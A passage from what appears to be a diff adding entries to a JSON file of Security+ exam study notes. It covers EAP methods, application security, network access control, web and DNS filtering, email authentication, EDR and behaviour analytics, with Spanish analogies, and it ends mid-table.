encapsulates EAP within an encrypted TLS tunnel, requiring a certificate on both server and client side.\n\n> *Como enviar un sobre dentro de una caja blindada: el sobre (EAP) viaja protegido por la caja (TLS).*\n\n#### EAP: EAP-TTLS (EAP Tunneled TLS)\n\n* **Definition:** An EAP method that creates an encrypted TLS tunnel using only a server-side certificate, then transports a secondary authentication protocol inside the tunnel for client authentication.\n\n##### The key difference between EAP-TTLS and PEAP:\n\n* PEAP = EAP inside the tunnel. EAP-TTLS = legacy protocols inside the tunnel.\n  \n  * If the question mentions **MSCHAPv2** being used for client auth → **PEAP** (that's its default inner method).\n  \n  * If the question mentions **PAP, CHAP, or legacy protocols** being tunneled → **EAP-TTLS** (that's its advantage — it doesn't force EAP inside).\n\n* Secondary trigger: if a question emphasizes **flexibility to support older/non-EAP authentication methods** → EAP-TTLS wins that description every time.\n\n> | Método   | Certificado servidor | Certificado cliente | Auth interna               |\n> | -------- | -------------------- | ------------------- | -------------------------- |\n> | EAP-TLS  | ✅                    | ✅                   | N/A                        |\n> | PEAP     | ✅                    | ❌                   | EAP (ej. MSCHAPv2)         |\n> | EAP-TTLS | ✅                    | ❌                   | Cualquier protocolo legacy |\n\n\n#### EAP: EAP-FAST (EAP Flexible Authentication via Secure Tunneling)\n\n* **Definition:** A Cisco-developed EAP method that uses Protected Access Credentials (PACs) to establish a TLS tunnel for credential verification, designed to allow secure re-authentication when users roam within a network without performing full authentication each time.\n\nEAP-FAST was created as a replacement for the vulnerable Lightweight EAP (LEAP) protocol.\n\n> *Como tener un pase VIP en un concierto: una vez verificado al entrar, puedes moverte entre áreas sin pasar por seguridad otra vez.*\n\n---"
+      },
+      {
+        "name": "Application Security",
+        "definition": "The objective domain (4.1) covering the techniques used to build applications that are secure by design, focused on preventing, detecting, and remediating vulnerabilities across the software development lifecycle.",
+        "analogy": "*Como construir un edificio con seguridad integrada desde los planos: no es solo poner una alarma al final, sino diseñar cada pared, puerta y ventana pensando en seguridad desde el inicio.*",
+        "tables": [
+          {
+            "headers": [
+              "Attribute",
+              "Protection"
+            ],
+            "rows": [
+              [
+                "`Secure`",
+                "Cookie only transmitted over HTTPS — prevents interception over HTTP"
+              ],
+              [
+                "`HttpOnly`",
+                "Cookie not accessible by JavaScript DOM — prevents XSS-based theft"
+              ],
+              [
+                "`SameSite`",
+                "Restricts cross-origin cookie access — reduces CSRF attack risk"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "**Front-end validation:** Performed in the browser/UI before data is sent to the server. Fast but bypassable.",
+          "**Back-end validation:** Performed on the server before data is processed. Authoritative and cannot be bypassed by the user.",
+          "**Validation rules:** Define what inputs are acceptable (e.g., a phone number field only accepts 10 digits, no letters or special characters)."
+        ],
+        "raw_content": "* **Definition:** The objective domain (4.1) covering the techniques used to build applications that are secure by design, focused on preventing, detecting, and remediating vulnerabilities across the software development lifecycle.\n\nThere are six areas covered under this objective: **input validation, secure cookies, static code analysis, dynamic code analysis, code signing, and sandboxing**. Together, these form a layered approach to securing software before, during, and after deployment.\n\n> *Como construir un edificio con seguridad integrada desde los planos: no es solo poner una alarma al final, sino diseñar cada pared, puerta y ventana pensando en seguridad desde el inicio.*\n\n### Application Security: Input Validation\n\n* **Definition:** A security technique that verifies all data inputs to an application meet defined criteria before the application processes them, preventing malicious data from triggering unintended behavior such as SQL injection, XSS, or buffer overflow attacks.\n\nInput validation acts as a **gatekeeper** — ensuring only well-defined, correctly formatted data reaches the application logic. It must be implemented at both the **front-end** (client-side) and **back-end** (server-side) because front-end validation alone can be bypassed by an attacker intercepting the request.\n\n> *Como los filtros en la entrada de agua de un edificio: primero hay una rejilla gruesa afuera (front-end) y luego un filtro fino adentro (back-end). Ambos son necesarios porque la rejilla sola no atrapa todo.*\n\n- **Front-end validation:** Performed in the browser/UI before data is sent to the server. Fast but bypassable.\n- **Back-end validation:** Performed on the server before data is processed. Authoritative and cannot be bypassed by the user.\n- **Validation rules:** Define what inputs are acceptable (e.g., a phone number field only accepts 10 digits, no letters or special characters).\n\n⚠️ **Exam Tip:** Input validation is not a standalone defense. It must be combined with a **defense-in-depth** strategy including secure communication protocols, error handling, and regular security auditing.\n\n### Application Security: Secure Cookies\n\n* **Definition:** Web cookies that are configured with security attributes (Secure, HttpOnly, SameSite) to prevent interception, unauthorized script access, and cross-site request forgery attacks.\n\nCookies store session and state information between the web server and client. If improperly configured, they can be exploited for **session hijacking** or **sensitive data theft**.\n\n> *Como una llave de hotel: si la llave no tiene protección de clonación, cualquiera que la toque puede copiarla. Los atributos de seguridad son esa protección.*\n\n| Attribute  | Protection                                                           |\n| ---------- | -------------------------------------------------------------------- |\n| `Secure`   | Cookie only transmitted over HTTPS — prevents interception over HTTP |\n| `HttpOnly` | Cookie not accessible by JavaScript DOM — prevents XSS-based theft   |\n| `SameSite` | Restricts cross-origin cookie access — reduces CSRF attack risk      |\n\n⚠️ **Exam Tip:** Always **generate a new session cookie on each authentication** rather than using persistent cookies, to prevent session hijacking.\n\n### Application Security: Static Code Analysis (SAST)\n\n* **Definition:** A security testing method that reviews and analyzes application source code before execution to identify potential vulnerabilities such as buffer overflows, SQL injection risks, XSS vectors, and missing input validation.\n\nAlso called **Static Application Security Testing (SAST)**. The analysis is performed by automated tools (software analyzers that must support the language used) or human reviewers (**manual code review**). When performed by a human, a **different programmer** should review the code than the one who wrote it, to minimize blind spots from assumptions or experience gaps.\n\n> *Como revisar un contrato legal antes de firmarlo: buscas errores y cláusulas problemáticas antes de que el contrato entre en vigor.*\n\n### Application Security: Dynamic Code Analysis (DAST)\n\n* **Definition:** A security testing method that analyzes an application while it is actively running to find vulnerabilities that static analysis cannot detect, such as runtime errors, memory leaks, and input-driven vulnerabilities.\n\nAlso called **Dynamic Application Security Testing (DAST)**. The two primary methods of DAST are fuzzing and stress testing, detailed below.\n\n> *Como probar un puente con cargas reales de tráfico: no basta con revisar los planos, hay que ver cómo se comporta bajo condiciones reales.*\n\n#### Dynamic Code Analysis: Fuzzing (Fuzz Testing)\n\n* **Definition:** A dynamic software testing technique that injects large volumes of random, malformed, or unexpected data (fuzz) into a system to discover crashes, code assertion failures, memory leaks, and security loopholes.\n\nFuzzing is automated and can uncover vulnerabilities that human testers or static tools would miss. The system is monitored for crashes or unexpected behavior in response to the fuzz input.\n\n> *Como meter basura aleatoria en una trituradora para ver si se rompe: si se atasca, hay un fallo de diseño.*\n\n#### Dynamic Code Analysis: Stress Testing\n\n* **Definition:** A type of dynamic software testing that evaluates system stability and reliability under extreme conditions and high loads to identify weak points and failure behaviors.\n\nStress testing simulates scenarios like thousands of concurrent users accessing a web application simultaneously to identify performance bottlenecks, test load balancing effectiveness, and ensure the system can recover from failure.\n\n> *Como llenar un estadio más allá de su capacidad diseñada para ver cuándo y cómo ceden las estructuras.*\n\n### Application Security: Code Signing\n\n* **Definition:** A security technique that uses a digital signature — created by hashing a file and encrypting the hash with the developer's private key — to verify the software author's identity and confirm that the code has not been altered since it was signed.\n\nThe code signing process:\n\n1. Developer computes a **cryptographic hash** of the software file.\n2. Hash is encrypted with the developer's **private key** to create the digital signature.\n3. The software is distributed with a **code signing certificate** containing the developer's public key.\n4. The recipient's OS uses the CA (Certification Authority) public key to **verify the signature** and confirm the code is unmodified, then asks the user whether to trust and run it.\n\n> *Como un sello notarial en un documento: no garantiza que el contenido sea bueno, pero sí confirma quién lo firmó y que no fue alterado después de la firma.*\n\n⚠️ **Exam Tip:** Code signing confirms **integrity and authenticity** — it does NOT guarantee the software is free of vulnerabilities. It only confirms the code has not been tampered with since the developer signed it.\n\n### Application Security: Sandboxing\n\n* **Definition:** A security mechanism that isolates running programs in a restricted environment, limiting the system resources and changes they can access, to safely execute untested or untrusted code without risking harm to the host system or network.\n\nSandboxes are used in browsers, email clients, and security research environments. They allow testing of potentially malicious code in a contained environment — including running multiple sandboxes with different operating systems on the same physical machine.\n\n> *Como un terrario de vidrio para estudiar insectos peligrosos: los puedes observar y analizar sin riesgo de que escapen al resto del laboratorio.*\n\nSandboxes provide more comprehensive protection than traditional antivirus tools because they can test code against **multiple OS configurations** simultaneously.\n\n---"
+      },
+      {
+        "name": "Network Access Control (NAC)",
+        "definition": "The objective domain (4.5) covering the security solution that scans and evaluates the security posture of devices attempting to connect to a network before granting access, enforcing compliance with security policies and quarantining non-compliant devices for remediation.",
+        "analogy": "*Como el control de sanidad en un aeropuerto internacional: si no cumples los requisitos de salud, no entras al país — esperas en cuarentena hasta que te pongas al día.*",
+        "tables": [
+          {
+            "headers": [
+              "Agent Type",
+              "Use Case",
+              "Behavior"
+            ],
+            "rows": [
+              [
+                "**Persistent**",
+                "Corporate-owned, managed devices",
+                "Installed software, continuous monitoring"
+              ],
+              [
+                "**Non-Persistent**",
+                "BYOD, college campuses, guest Wi-Fi",
+                "Downloaded via captive portal, scans once, self-deletes"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Factor",
+              "Description",
+              "Example"
+            ],
+            "rows": [
+              [
+                "**Time-based**",
+                "Restricts access to defined hours",
+                "Block logins at 2 AM for 9–5 business"
+              ],
+              [
+                "**Location-based**",
+                "Evaluates geolocation of connection (IP, GPS)",
+                "Flag login from Italy when user always logs in from Florida"
+              ],
+              [
+                "**Role-based (Adaptive NAC)**",
+                "Re-evaluates authorization based on what the device is trying to do",
+                "Block user laptop from accessing server management subnet, but allow a server to do so"
+              ],
+              [
+                "**Rule-based**",
+                "Logical if/then policy chains",
+                "If user = instructor → allow; if user = student → deny"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "Basic authentication (e.g., EAP)",
+          "Antivirus definition currency",
+          "Operating system patch status",
+          "Security configuration compliance",
+          "**Pass:** Device receives full network access.",
+          "**Fail:** Device is placed in a **quarantine screened subnet** where it can receive updates and patches but cannot communicate with the rest of the network until it passes reinspection."
+        ],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the security solution that scans and evaluates the security posture of devices attempting to connect to a network before granting access, enforcing compliance with security policies and quarantining non-compliant devices for remediation.\n\nNAC applies to both **on-premises wired/wireless devices** and **remote VPN connections**. The device is placed in a virtual holding area during inspection. NAC enforces a **zero trust architecture** as part of a defense-in-depth strategy.\n\n> *Como el control de sanidad en un aeropuerto internacional: si no cumples los requisitos de salud, no entras al país — esperas en cuarentena hasta que te pongas al día.*\n\n**NAC inspection checks can include:**\n\n- Basic authentication (e.g., EAP)\n- Antivirus definition currency\n- Operating system patch status\n- Security configuration compliance\n\n**Outcomes:**\n\n- **Pass:** Device receives full network access.\n- **Fail:** Device is placed in a **quarantine screened subnet** where it can receive updates and patches but cannot communicate with the rest of the network until it passes reinspection.\n\n### NAC: Persistent vs. Non-Persistent Agents\n\n* **Definition:** Persistent agents are software installed permanently on managed devices for continuous NAC enforcement; non-persistent agents are downloaded temporarily at connection time, perform a compliance scan, and then delete themselves — commonly used in BYOD environments.\n\n| Agent Type         | Use Case                            | Behavior                                                |\n| ------------------ | ----------------------------------- | ------------------------------------------------------- |\n| **Persistent**     | Corporate-owned, managed devices    | Installed software, continuous monitoring               |\n| **Non-Persistent** | BYOD, college campuses, guest Wi-Fi | Downloaded via captive portal, scans once, self-deletes |\n\n> *El persistente es como un guardia de seguridad asignado permanentemente a tu escritorio. El no-persistente es como el guardia de seguridad temporal de un evento: llega, revisa tu credencial y se va.*\n\n### NAC: IEEE 802.1X\n\n* **Definition:** An IEEE standard for port-based network access control that provides authenticated access to wireless and wired networks, forming the foundation upon which most modern NAC solutions are built.\n\nNAC can be implemented as a hardware or software solution, and most modern NAC platforms build additional features on top of the 802.1X foundation.\n\n### NAC: Access Control Factors\n\n* **Definition:** Rule-based criteria beyond health policy compliance that NAC systems use to grant or deny network access, including time, location, role, and logical rule sets.\n\n| Factor                        | Description                                                         | Example                                                                                |\n| ----------------------------- | ------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |\n| **Time-based**                | Restricts access to defined hours                                   | Block logins at 2 AM for 9–5 business                                                  |\n| **Location-based**            | Evaluates geolocation of connection (IP, GPS)                       | Flag login from Italy when user always logs in from Florida                            |\n| **Role-based (Adaptive NAC)** | Re-evaluates authorization based on what the device is trying to do | Block user laptop from accessing server management subnet, but allow a server to do so |\n| **Rule-based**                | Logical if/then policy chains                                       | If user = instructor → allow; if user = student → deny                                 |\n\n> *Como un edificio corporativo con diferentes niveles de acceso por tarjeta: el guardia no solo verifica tu identidad, sino también tu rol, la hora y desde dónde vienes.*\n\n---"
+      },
+      {
+        "name": "Web and DNS Filtering",
+        "definition": "The objective domain (4.5) covering the techniques used to restrict or control the internet content users can access, in order to prevent productivity loss and protect against malicious websites.",
+        "analogy": "*Como tener dos líneas de defensa para proteger una casa: una reja en la entrada de la calle (DNS filtering) y guardias revisando a cada visitante que sí logra entrar (web filtering).*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the techniques used to restrict or control the internet content users can access, in order to prevent productivity loss and protect against malicious websites.\n\nThis objective covers two distinct filtering approaches: **web filtering** (content-level filtering with six sub-methods) and **DNS filtering** (domain-resolution-level blocking).\n\n> *Como tener dos líneas de defensa para proteger una casa: una reja en la entrada de la calle (DNS filtering) y guardias revisando a cada visitante que sí logra entrar (web filtering).*\n\n### Web and DNS Filtering: Web Filtering (Content Filtering)\n\n* **Definition:** A technique used to restrict or control the content a user can access on the internet, implemented through agents, proxies, URL scanning, content categorization, block rules, or reputation scoring.\n\n> *Como un filtro de correo que no solo bloquea spam, sino que también organiza lo que entra según reglas definidas por la organización.*\n\n#### Web Filtering: Agent-Based Web Filtering\n\n* **Definition:** A web filtering method that installs a software agent on each device to enforce internet usage policies regardless of the network the device is connected to — ideal for remote and mobile workers.\n\nSince the policy is applied **at the device level**, it works on corporate networks, public Wi-Fi, and home networks alike.\n\n#### Web Filtering: Centralized Proxy\n\n* **Definition:** A server that acts as an intermediary between users and the internet, evaluating all web requests against organizational policies before forwarding or blocking them.\n\nWhen a user requests a website, the proxy evaluates it against policy. If compliant, the proxy retrieves the content on behalf of the user. If non-compliant, the request is blocked and an error message is returned.\n\n#### Web Filtering: URL Scanning\n\n* **Definition:** A technique that checks requested URLs against a database of known malicious websites before allowing or denying access.\n\nIf the URL is on the known-malicious list, access is blocked. If not found in the database, it is assumed safe and access is permitted.\n\n#### Web Filtering: Content Categorization\n\n* **Definition:** A method of classifying websites into categories (social media, adult content, gambling, etc.) so organizations can block or allow entire categories based on their usage policies.\n\n#### Web Filtering: Block Rules\n\n* **Definition:** Specific administrator-defined rules that prevent access to certain websites or IP addresses, often used reactively when a specific threat is identified (e.g., blocking an IP address used for data exfiltration).\n\n#### Web Filtering: Reputation-Based Filtering\n\n* **Definition:** A web filtering method that blocks or allows websites based on a reputation score assigned by a third-party service, factoring in the site's history of hosting malware, phishing, or other malicious activity.\n\n### Web and DNS Filtering: DNS Filtering\n\n* **Definition:** A security technique that blocks access to specific websites by preventing the DNS server from resolving blacklisted domain names into IP addresses, effectively stopping connections before they are established.\n\nWhen a user requests a website, their device sends a DNS query. If the domain is on the **block list**, the DNS server refuses to return the IP address and the connection never occurs. If not on the block list, the IP address is returned and the user is redirected to the site.\n\n> *Como arrancar las páginas de un directorio telefónico: si el número no aparece, no puedes llamar, aunque sepas que la empresa existe.*\n\nDNS filtering is commonly used in schools, universities, and enterprise environments to enforce internet usage policies and prevent access to malicious or prohibited content.\n\n---"
+      },
+      {
+        "name": "Email Security",
+        "definition": "The objective domain (4.5) covering the protocols and mechanisms used to safeguard email content, accounts, and infrastructure from unauthorized access, loss, or compromise.",
+        "analogy": "*Como un sistema de aduana para el correo: verifica la identidad del remitente, revisa que el paquete no haya sido alterado, y decide qué hacer si algo no cuadra.*",
+        "tables": [
+          {
+            "headers": [
+              "Method",
+              "Published At",
+              "Contains"
+            ],
+            "rows": [
+              [
+                "**SPF**",
+                "TXT record at the domain root",
+                "List of IPs/servers authorized to send as that domain"
+              ],
+              [
+                "**DKIM**",
+                "TXT record under a selector (e.g., `selector1._domainkey.empresa.com`)",
+                "The **public key** used to verify the signature"
+              ],
+              [
+                "**DMARC**",
+                "TXT record at `_dmarc.empresa.com`",
+                "The policy (`none`/`quarantine`/`reject`) and reporting destination"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Deployment Type",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**On-Premise**",
+                "Physical server in the organization's own data center; maximum control but requires admin overhead"
+              ],
+              [
+                "**Cloud-Based**",
+                "Hosted by a third-party; highly scalable and low maintenance but higher cost and limited customization"
+              ],
+              [
+                "**Hybrid**",
+                "Combines both; balances control and convenience"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "**Email routing:** Directs outgoing email to correct destinations; routes incoming email to the right inboxes.",
+          "**Email security:** Scans for spam, phishing, and malware.",
+          "**Policy enforcement:** Blocks outgoing emails containing sensitive data; blocks incoming emails from known-malicious senders.",
+          "**Encryption/Decryption:** Encrypts outgoing and decrypts incoming emails to protect sensitive content in transit."
+        ],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the protocols and mechanisms used to safeguard email content, accounts, and infrastructure from unauthorized access, loss, or compromise.\n\nThis objective covers three email authentication protocols (**DKIM, SPF, DMARC**), the **email gateway** infrastructure, and **spam filtering** mechanisms.\n\n> *Como un sistema de aduana para el correo: verifica la identidad del remitente, revisa que el paquete no haya sido alterado, y decide qué hacer si algo no cuadra.*\n\n### Email Security: DKIM — DomainKeys Identified Mail\n\n* **Definition:** An email authentication method that adds a cryptographic digital signature to outgoing email headers, allowing receiving servers to verify that the email was sent from the claimed domain and that the content was not modified in transit.\n\nDKIM works by comparing the signature in the email header against the sender's **public key published in the domain's DNS records**. If the signature validates, the email is confirmed to be authentic and unmodified.\n\n> *Como un sello de cera en una carta medieval: confirma quién la envió y que nadie la abrió en el camino.*\n\n**Benefits:** Email authentication · Protection against email spoofing · Improved deliverability · Enhanced domain reputation\n\n### Email Security: SPF — Sender Policy Framework\n\n* **Definition:** An email authentication method that allows receiving mail servers to verify that an incoming email's sender IP address is authorized to send email on behalf of the claimed domain, as defined in that domain's DNS records.\n\nWhen email arrives, the receiving server queries the sender's domain DNS records for the SPF record. If the sending IP is not listed as authorized, the email is flagged as spam or rejected.\n\n> *Como una lista de empleados autorizados para hacer pedidos a nombre de una empresa: si el que llama no está en la lista, el proveedor rechaza el pedido.*\n\n**Benefits:** Prevents email spoofing · Improved email deliverability · Enhanced domain reputation\n\n### Email Security: DMARC — Domain-Based Message Authentication, Reporting, and Conformance\n\n* **Definition:** An email validation system that builds on DKIM and SPF by verifying domain alignment between the authenticated domain and the visible \"From\" address, enforcing what receiving servers should do with emails that fail this check, and providing reporting back to the domain owner.\n\nDMARC requires that at least one of DKIM or SPF passes AND is **aligned** — meaning the domain validated by DKIM or SPF must match the domain shown in the visible \"From\" header. This alignment check is what DMARC adds on top of DKIM/SPF individually: an attacker can pass SPF or DKIM using their own legitimately-configured domain while still spoofing the \"From\" address seen by the user. Without DMARC, SPF and DKIM alone don't prevent this.\n\nThe domain owner publishes a DMARC policy in DNS that tells receiving servers what to do when alignment or authentication fails (`none`, `quarantine`, `reject`), removing the inconsistency of each receiving server deciding independently how to handle failures.\n\n> *Como el jefe de seguridad que no solo revisa los controles, sino que también verifica que la identificación coincida con la cara de la persona (alignment), define qué hacer cuando algo falla (advertencia, cuarentena o expulsión), y además le manda un reporte diario a la central de cuántos intentos sospechosos hubo.*\n\n#### Email Security: DMARC — Reporting (rua/ruf)\n\n* **Definition:** The mechanism by which DMARC sends aggregate (rua) and forensic (ruf) failure reports back to the domain owner, providing visibility into spoofing attempts that DKIM and SPF alone do not offer.\n\nNeither DKIM nor SPF report back to the domain owner. DMARC's reporting function is what allows a domain owner to detect that their domain is actively being used for phishing or spoofing campaigns — something otherwise invisible without DMARC in place.\n\nDMARC is the primary defense against **business email compromise (BEC)**, phishing emails, and email scams at the domain level.\n\n⚠️ **Exam Tip:** Every enterprise email server should implement DMARC as a **minimum baseline** of email protection. DMARC requires only one of DKIM or SPF to pass (with alignment) — not both — but without DMARC, a passing SPF or DKIM check does not guarantee the visible \"From\" address is legitimate.\n\n### Email Security: DNS Record Locations for SPF, DKIM, and DMARC\n\n* **Definition:** The specific DNS TXT record locations where SPF, DKIM, and DMARC are published and validated, none of which require configuration within SMTP itself.\n\nSMTP has no built-in authentication mechanism — that's precisely why SPF, DKIM, and DMARC exist as separate, DNS-based add-ons rather than features of SMTP itself.\n\n| Method | Published At | Contains |\n|---|---|---|\n| **SPF** | TXT record at the domain root | List of IPs/servers authorized to send as that domain |\n| **DKIM** | TXT record under a selector (e.g., `selector1._domainkey.empresa.com`) | The **public key** used to verify the signature |\n| **DMARC** | TXT record at `_dmarc.empresa.com` | The policy (`none`/`quarantine`/`reject`) and reporting destination |\n\nThe one exception that touches the mail server (not DNS): DKIM's **private key** lives on the outbound mail server (the MTA — e.g., Postfix, Exchange, SendGrid), which uses it to cryptographically sign each outgoing email. The corresponding **public key** is what gets published in DNS for the receiving server to verify that signature against.\n\nSPF and DMARC require no mail-server-side configuration at all — they are purely DNS records that the **receiving** server queries to validate.\n\n> *El SMTP es el camión que transporta el paquete; el DNS es la oficina notarial donde están registrados los documentos que prueban que el remitente es quien dice ser. El camión no verifica nada — el receptor consulta la notaría (DNS) para confirmar.*\n\n**Validation flow:**\n---\n\n### Email Security: Email Gateway\n\n* **Definition:** A server or system that serves as the entry and exit point for all organizational email, responsible for routing, filtering, encryption/decryption, and policy enforcement of incoming and outgoing email traffic using SMTP.\n\nEmail gateways use **SMTP (Simple Mail Transfer Protocol)** to send and receive email. All email passes through the gateway before delivery.\n\n> *Como la aduana de un aeropuerto: todo lo que entra y sale pasa por ahí, se inspecciona, y se permite o bloquea según las políticas vigentes.*\n\n**Email gateway functions:**\n\n- **Email routing:** Directs outgoing email to correct destinations; routes incoming email to the right inboxes.\n- **Email security:** Scans for spam, phishing, and malware.\n- **Policy enforcement:** Blocks outgoing emails containing sensitive data; blocks incoming emails from known-malicious senders.\n- **Encryption/Decryption:** Encrypts outgoing and decrypts incoming emails to protect sensitive content in transit.\n\n| Deployment Type | Description                                                                                            |\n| --------------- | ------------------------------------------------------------------------------------------------------ |\n| **On-Premise**  | Physical server in the organization's own data center; maximum control but requires admin overhead     |\n| **Cloud-Based** | Hosted by a third-party; highly scalable and low maintenance but higher cost and limited customization |\n| **Hybrid**      | Combines both; balances control and convenience                                                        |\n\n### Email Security: Spam Filtering\n\n* **Definition:** A process that detects and blocks unsolicited, unwanted emails from reaching user inboxes using techniques such as content analysis, Bayesian filtering, DNS-based blocklists, and predefined email filtering rules.\n\nSpam filtering analyzes email content for commonly used spam language (e.g., \"lottery,\" \"free,\" \"prize\") and evaluates sender reputation to determine if an email should be delivered, quarantined, or rejected.\n\n> *Como un portero de club que tiene una lista negra de palabras: si tu mensaje de entrada incluye frases prohibidas, no pasas.*\n\n---"
+      },
+      {
+        "name": "Endpoint Detection and Response (EDR)",
+        "definition": "The objective domain (4.5) covering the cybersecurity technology category that continuously monitors endpoint devices for signs of threats, records data in a centralized database, and enables security analysts to investigate, respond to, and remediate identified threats.",
+        "analogy": "*Como la evolución de un sistema de seguridad: primero cámaras enfocadas en una sola entrada (EDR), un sistema de sellos que detecta manipulación de objetos específicos (FIM), y finalmente una central de monitoreo que conecta todas las entradas, cámaras y sensores del edificio en un solo panel (XDR).*",
+        "tables": [
+          {
+            "headers": [
+              "Technology",
+              "Scope",
+              "Focus"
+            ],
+            "rows": [
+              [
+                "**EDR**",
+                "Endpoints only",
+                "Computers, laptops, mobile devices"
+              ],
+              [
+                "**XDR**",
+                "Endpoints + Network + Email + Cloud + Server",
+                "All security layers, correlated in one platform"
+              ],
+              [
+                "**FIM**",
+                "File system integrity",
+                "Often included as a component of EDR/XDR"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the cybersecurity technology category that continuously monitors endpoint devices for signs of threats, records data in a centralized database, and enables security analysts to investigate, respond to, and remediate identified threats.\n\nThis objective covers three related but distinct technologies: **EDR** itself, **File Integrity Monitoring (FIM)** as a component technology, and **Extended Detection and Response (XDR)** as the evolved, multi-layer successor.\n\n> *Como la evolución de un sistema de seguridad: primero cámaras enfocadas en una sola entrada (EDR), un sistema de sellos que detecta manipulación de objetos específicos (FIM), y finalmente una central de monitoreo que conecta todas las entradas, cámaras y sensores del edificio en un solo panel (XDR).*\n\n### EDR: The Six-Step EDR Process\n\n* **Definition:** The operational workflow used by EDR solutions to continuously monitor and gather endpoint data, consisting of data collection, data consolidation, threat detection, alerts and threat response, threat investigation, and remediation.\n1. **Data Collection:** Gathered from all endpoints (desktops, laptops, mobile devices) — system processes, registry changes, memory usage, network traffic patterns.\n2. **Data Consolidation:** Collected data is sent to a centralized security database (on-premise or cloud) for analysis.\n3. **Threat Detection:** Uses **signature-based detection** (known malicious patterns) and **behavior-based detection** (abnormal behavior deviating from baseline).\n4. **Alerts and Threat Response:** Sends alerts to the security team or performs automated containment actions, such as isolating the affected endpoint from the network.\n5. **Threat Investigation:** Provides detailed timelines of endpoint activity and forensic data to determine the threat's nature, origin, and impact.\n6. **Remediation:** Removes malicious files, reverses changes made by the threat, and restores systems to a secure baseline.\n\n### EDR: Extended Detection and Response (XDR)\n\n* **Definition:** A security strategy that integrates multiple protection technologies (endpoint, network, email, server, cloud) into a single unified platform to improve threat detection accuracy, automate correlation across security layers, and simplify incident response.\n> By using an extended detection and response solution, you no longer need to have separate solutions for your network security, email security, and endpoint security. Instead, your organization can consolidate these separate solutions into a single, consolidated platform.\n\nXDR extends the capabilities of EDR by collecting and correlating data **across all security layers simultaneously**, eliminating the need for separate, siloed security solutions.\n\n> *Como un sistema de seguridad de un aeropuerto moderno: en lugar de tener cámaras, detectores de metales y scanners de equipaje como sistemas separados, todo está integrado en una sola consola que correlaciona las alertas.*\n\n### EDR: File Integrity Monitoring (FIM)\n\n* **Definition:** A security control that validates the integrity of operating system and application files by continuously comparing their current cryptographic hash values against a known-good baseline, alerting when unauthorized changes are detected.\n\nFIM uses an **agent** to monitor critical system files. Each file is **hashed** and the hash digest is stored in a secure baseline database. If an unauthorized change is detected (the current hash no longer matches the baseline), the security team is alerted to investigate whether this is a true security breach.\n\n> *Como un inventario sellado de un museo: cada objeto tiene una etiqueta de seguridad. Si la etiqueta no coincide al verificar, algo fue movido o reemplazado.*\n\nFIM monitors: binary files · system application files · configuration files · parameter files. It is often included as a component of broader EDR or XDR solutions.\n\n\n| Technology | Scope                                        | Focus                                           |\n| ---------- | -------------------------------------------- | ----------------------------------------------- |\n| **EDR**    | Endpoints only                               | Computers, laptops, mobile devices              |\n| **XDR**    | Endpoints + Network + Email + Cloud + Server | All security layers, correlated in one platform |\n| **FIM**    | File system integrity                        | Often included as a component of EDR/XDR        |\n\n---"
+      },
+      {
+        "name": "User Behavior Analytics (UBA) // User and Entity Behavior Analytics (UEBA)",
+        "definition": "The objective domain (4.5) covering the advanced cybersecurity strategy that uses big data, machine learning, and statistical analysis to establish a baseline of normal user behavior, then continuously monitors for anomalies that may indicate insider threats, compromised credentials, or external attacks.",
+        "analogy": "*Como un banco que conoce tus patrones de compra: si de repente aparece una transacción desde otro país a las 3 AM, el sistema lo marca automáticamente como sospechoso.*",
+        "tables": [],
+        "list_items": [
+          "A user who always logs in during business hours suddenly logs in at 2 AM → flagged as anomalous.",
+          "An instructor suddenly attempting to access HR or financial data they have never accessed before → flagged as suspicious.",
+          "A user account that normally reads data suddenly attempts to modify or delete data → flagged as potentially compromised.",
+          "**Early threat detection:** Identifies threats before significant damage occurs (e.g., flagging a large data download as a potential exfiltration attempt that manual log review might miss for weeks).",
+          "**Insider threat detection:** Detects subtle behavioral changes invisible to signature-based tools.",
+          "**Improved incident response:** Provides detailed behavioral timelines to accelerate investigation; can automatically log out a user account suspected of compromise."
+        ],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the advanced cybersecurity strategy that uses big data, machine learning, and statistical analysis to establish a baseline of normal user behavior, then continuously monitors for anomalies that may indicate insider threats, compromised credentials, or external attacks.\n\nUBA collects data from network traffic, user devices, and application logs to learn what **normal** looks like for each user. Deviations from the baseline trigger alerts for security team review.\n\n> *Como un banco que conoce tus patrones de compra: si de repente aparece una transacción desde otro país a las 3 AM, el sistema lo marca automáticamente como sospechoso.*\n\n**UBA use cases:**\n\n- A user who always logs in during business hours suddenly logs in at 2 AM → flagged as anomalous.\n- An instructor suddenly attempting to access HR or financial data they have never accessed before → flagged as suspicious.\n- A user account that normally reads data suddenly attempts to modify or delete data → flagged as potentially compromised.\n\n**Key benefits:**\n\n- **Early threat detection:** Identifies threats before significant damage occurs (e.g., flagging a large data download as a potential exfiltration attempt that manual log review might miss for weeks).\n- **Insider threat detection:** Detects subtle behavioral changes invisible to signature-based tools.\n- **Improved incident response:** Provides detailed behavioral timelines to accelerate investigation; can automatically log out a user account suspected of compromise.\n\n### UBA: UEBA — User and Entity Behavior Analytics\n\n* **Definition:** An extension of UBA that expands monitoring beyond user accounts to include entities — network devices such as routers, servers, and endpoints — providing a more comprehensive view of anomalous activity across the entire network environment.\n\n> *UBA monitorea a las personas; UEBA monitorea a las personas Y a las máquinas.*\n\n---"
+      },
+      {
+        "name": "Selecting Secure Protocols",
+        "definition": "The objective domain (4.5) covering the process of choosing encrypted protocols, appropriate ports, and the correct transport method to ensure that data confidentiality, integrity, and reliability are maintained across an enterprise network.",
+        "analogy": "*Como elegir entre enviar dinero en efectivo por correo ordinario o en un sobre blindado con rastreo: ambos llegan, pero solo uno es seguro.*",
+        "tables": [
+          {
+            "headers": [
+              "Use Case",
+              "Insecure Protocol",
+              "Secure Protocol"
+            ],
+            "rows": [
+              [
+                "Web browsing",
